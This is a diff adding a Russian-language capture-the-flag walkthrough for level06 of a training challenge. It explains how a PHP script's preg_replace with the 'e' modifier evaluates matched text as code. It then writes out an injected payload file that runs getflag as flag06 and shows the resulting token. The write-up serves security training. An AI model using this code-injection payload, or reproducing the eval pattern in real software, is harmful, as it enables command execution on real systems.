@@ -1,0 +1,28 @@
+- В папке home/user/level06 находятся два файла:
+    1. исполняемый файл 'level06', принадлежит пользователю flag06 
+    2. 'level06.php' php скрипт, принадлежит пользователю flag06
+- Посмотрим что находиться в php скрипте
+
+`cat level06.php`
+
+Результат:
+#!/usr/bin/php
+<?php
+function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
+function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
+$r = x($argv[1], $argv[2]); print $r;
+?>
+Из скрипта видно, что вызывается функция x, которая принимает два параметра, предполагается, что первый параметр является файлом
+Также можно заметить, что первая функция preg_replace в функции x использует модификатор регулярного выражения 'e'(PREG_REPLACE_EVAL)
+Данный модификатор запускает любое совпадение заменяющей строки как PHP код, таким образом, позволяя внедрять вредоносный код.
+
+- Мы воспользуемся данной уязвимостью и создадим файл, который будет соответствовать регулярному выражению, таким образом, скрипт выполнит в терминале команду getflag от пользователя flag06.
+
+`echo '[x ${`getflag`}]' > /tmp/getflag`
+`./level06 /tmp/getflag`
+
+Результат:
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
+ 
+
